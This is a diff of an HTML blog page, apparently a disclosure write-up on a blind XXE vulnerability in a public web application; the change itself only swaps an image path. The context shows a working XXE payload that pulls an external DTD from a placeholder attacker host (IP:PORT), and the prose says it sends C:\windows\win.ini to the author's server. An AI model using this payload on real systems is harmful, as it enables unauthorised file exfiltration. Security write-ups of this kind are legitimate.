@@ -171,7 +171,7 @@
 </code></pre><p>Now, to trigger the vulnerability I will send in a POST request with the following payload url and base64 encoded:</p>
 <pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % asd SYSTEM &#34;http://IP:PORT/test.dtd&#34;&gt;%asd;]&gt;&lt;foo&gt;&amp;send;&lt;/foo&gt;
 </code></pre><p>In the first part, when we send this payload, the xml parser will process the payload to hit our dtd file. Then the xml parser will process the external dtd file that I created which will instruct it to fetch C:\windows\win.ini and send it back to my web server. The end result will have the file contents of the file encoded in our web server&rsquo;s log and we can easily decode to read the file contents.</p>
-<p><img src="C:%5CUsers%5Ckenny%5COneDrive%5CPictures%5CScreenshots%5Cxxe_results.png" alt="File Contents Retrieved"></p>
+<p><img src="/images/xxe_results.png" alt="File Contents Retrieved"></p>
 <p>Thank you for reading this short writeup on discovering a Blind XXE on a public web application. I have reported this vulnerability to the proper authorities and they have now implemented security measures against this attack!</p>
 
     </div>
